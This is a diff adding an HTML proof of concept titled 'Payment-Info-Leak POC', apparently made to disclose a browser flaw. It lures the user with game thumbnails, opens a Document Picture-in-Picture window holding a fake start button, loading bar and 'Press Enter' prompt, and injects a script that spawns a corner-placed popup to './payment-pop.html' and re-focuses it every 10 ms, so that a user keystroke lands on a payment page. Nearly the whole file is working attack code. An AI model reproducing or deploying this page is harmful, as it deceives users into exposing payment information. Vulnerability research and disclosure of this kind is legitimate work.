@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html id="htmlid">
+  <head>
+    <meta charset="utf-8">
+    <title>Payment-Info-Leak POC </title>
+     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+    
+  <style>
+body {
+background-color: black;
+}
+     html { height:100%; }
+body { position:absolute; top:0; bottom:0; right:0; left:0; }
+
+/** This style for Dino Game in Modal**/
+*{
+    padding: 0;
+    margin: 0;
+    overflow-x: hidden;
+     overflow-y: hidden;
+}
+
+p{
+    text-align: center;
+}
+
+html,
+body {
+  margin: 0;
+  font-family: sans-serif;
+}
+
+main {
+  overflow-x: hidden;
+  display: flex;
+      max-height: 399px;
+}
+
+h1 {
+  margin: 0;
+  padding: 0;
+}
+
+
+section:nth-child(even) {
+  
+  color: white;
+}
+
+ section {
+    min-width: 30vw;
+    min-height: 20vh;
+     max-width: 120%;
+    max-height: 120%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 4ch;
+    overflow: hidden;
+    border-radius: 400px;
+    box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
+   border: 6px solid rgba(0, 0, 0, 0.4);
+  }
+
+  img {
+      width:450px;
+      height:450px;
+    max-width: 120%;
+    max-height: 120%;
+  
+  }
+ 
+  </style>
+  
+  </head>
+  <body>
+      
+  <div id="htmlevent" style='position: absoulte; top: 10%; z-index: 2; color: #999DDD;'><center><br><h2 style="color: green; text-shadow: 0px 0px 4px rgba(255,255,255,0.7); border-style: dotted; border-width: 3px; max-width: 400px" id="ar">Scroll to Select Game to Play</h2><br><br>
+
+<div id="games">
+  
+  <main>
+    <section>
+      <img id="dino" src="https://vrphunt.com/chrome/payment-spf/dino.png" onclick="getImageElement(this)"></img>
+    </section>
+    <section>
+      <img id="mario" src="https://vrphunt.com/chrome/payment-spf/mario.jpg" onclick="getImageElement(this)"></img>
+    </section>
+    <section>
+      <img id="sniper" src="https://vrphunt.com/chrome/payment-spf/sniper.jpg" onclick="getImageElement(this)"></img>
+    </section>
+    <section>
+      <img id="sonic" src="https://vrphunt.com/chrome/payment-spf/sonic.webp" onclick="getImageElement(this)"></img>
+    </section>
+    <section>
+      <img id="race" src="https://vrphunt.com/chrome/payment-spf/race.jpg" onclick="getImageElement(this)"></img>
+    </section>
+  </main>
+  
+</div>
+ 
+ 
+<script>
+ function getImageElement(element) {
+      pipOpen(element);
+    }
+ 
+    
+    let pipWindow = null;
+    let isDragging = false;
+    let offsetX, offsetY;
+    
+         const pipOpen = async (imageElement) => {
+     
+  pipWindow = await window.documentPictureInPicture?.requestWindow({
+      width: 552, 
+      height: 574,
+        });
+        
+        
+        
+const imgContainer = document.createElement('div');
+      imgContainer.style.backgroundColor = '#232323';
+      pipWindow.document.body.style.backgroundColor = '#232323';
+
+const img = document.createElement('img');
+      img.src = imageElement.src;
+      img.style.maxWidth = '400px';
+      img.style.maxHeight = '400px';
+      img.style.width='400px';
+      img.style.height='400px';
+      imgContainer.appendChild(img);
+      pipWindow.document.body.append(imgContainer);
+      
+      const playbutton = document.createElement('button');
+        playbutton.innerText = 'Click to start';
+        playbutton.style.marginLeft = '20px';
+        playbutton.style.position = 'absolute';
+        playbutton.style.top = '300px';
+        playbutton.style.left = '150px';
+        playbutton.style.width = '120px';
+        playbutton.style.height = '30px';
+        playbutton.style.border = '1px solid rgba(0, 0, 0, 0.7)';
+        playbutton.style.borderRadius = '5px';
+        playbutton.style.backgroundColor = '#3498db'; 
+        playbutton.style.textShadow = '2px 2px 3px rgba(0, 0, 0, 0.7)';
+        playbutton.style.boxShadow = '0px 4px 0px #1f4e90'; 
+
+        playbutton.addEventListener('click', () => {
+        playbutton.style.display = 'none'; 
+        const h1 = document.createElement('h1');
+        h1.innerText = 'Press Enter, then continue';
+        h1.style.border = '4px dashed cyan'; 
+        h1.style.padding = '5px';
+        h1.style.margin = '0';
+        h1.style.textAlign = 'center';
+        h1.style.position = 'absolute';
+        h1.style.top = '340px';
+        h1.style.left = '20px';
+        h1.style.color = 'red';
+        h1.style.textShadow = '5px 5px 7px rgba(0, 0, 0, 0.8)';
+        h1.style.textShadow = '1px 2px 0px yellow';
+        
+    const progressBar = pipWindow.document.createElement('progress');
+    progressBar.value = 0; 
+    progressBar.max = 100;
+    const interval = 125; 
+    let progressValue = 0;
+        progressBar.style.position = 'absolute';
+        progressBar.style.top = '305px';
+        progressBar.style.left = '140px';
+        progressBar.style.height = '40px';
+        progressBar.style.width = '170px';
+        
+        const loadingText = pipWindow.document.createElement('span');
+        loadingText.innerText = 'Loading...';
+        loadingText.style.position = 'absolute';
+        loadingText.style.top = '315px';
+        loadingText.style.left = '160px';
+        
+  const animateProgressBar = () => {
+      
+    if (progressValue <= 100) {
+      progressBar.value = progressValue;
+      progressValue++;
+      setTimeout(animateProgressBar, interval);
+    
+        
+    }
+  };
+  animateProgressBar();
+
+        pipWindow.document.body.appendChild(h1);
+        pipWindow.document.body.appendChild(progressBar);
+        pipWindow.document.body.appendChild(loadingText);
+        pipWindow.document.body.appendChild(h1);
+      });
+
+      pipWindow.document.body.appendChild(playbutton);
+
+      
+   const scriptElement = document.createElement('script');
+        scriptElement.textContent = `
+        
+        let popupOpen = false;
+        document.addEventListener('click', () => {
+        
+        const popupWidth = 423;
+        const popupHeight = 440;
+        const left = (screen.width - popupWidth) - 74;
+        const top = (screen.height - popupHeight) - 85;
+        
+        if (!popupOpen) { 
+        popupOpen = true;
+        
+        var popupWindow = window.open('./payment-pop.html', '', \`width=\${popupWidth},height=\${popupHeight},left=\${left},top=\${top}\`);
+        setInterval(() => {
+        if (popupWindow && !popupWindow.closed) {
+        popupWindow.focus();
+        }
+        }, 10);
+        }
+        
+        });
+        `;
+        
+      pipWindow.document.body.append(imgContainer, scriptElement);
+
+        };
+
+// this part for game horizontal scroll
+const scrollContainer = document.querySelector("main");
+
+scrollContainer.addEventListener("wheel", (evt) => {
+    evt.preventDefault();
+    scrollContainer.scrollLeft += evt.deltaY;
+});
+
+</script>
+
+
+<div id="showPopup"  style="position: fixed; bottom: 200px; left: 50%; transform: translateX(-50%); width: 100px; padding: 10px; text-align: center; font-size: 14px;">
+   
+</div>
+
+ 
+  </body>
+ 
+  
+</html>
